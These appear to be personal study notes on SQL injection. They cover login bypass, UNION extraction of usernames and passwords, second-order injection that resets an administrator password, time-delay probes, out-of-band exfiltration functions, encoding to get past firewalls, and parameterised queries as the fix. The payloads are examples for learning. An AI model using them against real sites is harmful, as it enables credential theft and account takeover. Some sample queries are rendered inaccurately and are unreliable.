SQL Injection ‘--

Structured Query Language lets you access and manipulate databases.

An insecure site may query it’s database with the following link:

insecuresite.com/products?category=Gifts


Resulting in an SQL Query:

SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1


A malicious actor may embed code that subverts the SQL query logic; appending [’--] (comment, double-dash) completes the SQL syntax and indicates the (original) following code is a COMMENT, and so disregards any further action or filters:

insecuresite.com/products?category=Gifts’--


Resulting in a relatively (for now) benign query to display all ‘Gifts’ category items
SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1


Logging in

Username: 
username’--
Password: 
xxx


SELECT * FROM * [users]
WHERE username = ‘username’-- AND password = ‘xxx’ 

Gifts’ UNION SELECT username, password FROM users--'

“Out of Band Network”
Exfiltrate data through outbound channel via DNS or HTTP.
File operation function: [load_file(), master..xp_dirtree]
Establish connection function: [DBMS_LDAP.INIT, UTL_HTTP.request]

Detecting SQLi Vulnerabilities
Submit logic and observe response to consider what is running in background
‘...
ASCII(97) = ‘a’
‘ OR 1=1–
‘; waitfor delay (‘0:0:20’)--


Second Order SQLi
    Injection of a vulnerability which is processed subsequently to the initial query.
    Server runs the SQLi directly, using its own authority to apply the code.

First Order, on account creation inserts subversive query:

Username: 
badguy’ ;UPDATE users SET password = ‘letmein’ WHERE user = ‘administrator’--
Password: 
xxx


Second Order, when referenced, “username” alters privileged login credentials:
    
SELECT * FROM user_options WHERE user = badguy’ UPDATE users SET password = ‘letmein’ WHERE user = ‘administrator’--


Web Application Firewall Avoidance
WAFs may detect key subversive logic words (SELECT/etc.), encoding the SQL logic may bypass vulnerable WAF settings, dec/hex:

SNOWFLAKE → [HEX ENCODE] → 536E6F77666C616B65
    
Preventing SQi
SELECT    Parameterised Queries to avoid direct concatenation into logic
UPDATE
INSERT
SELECT    Whitelist permitted values OR Use different logic
ORDER BY
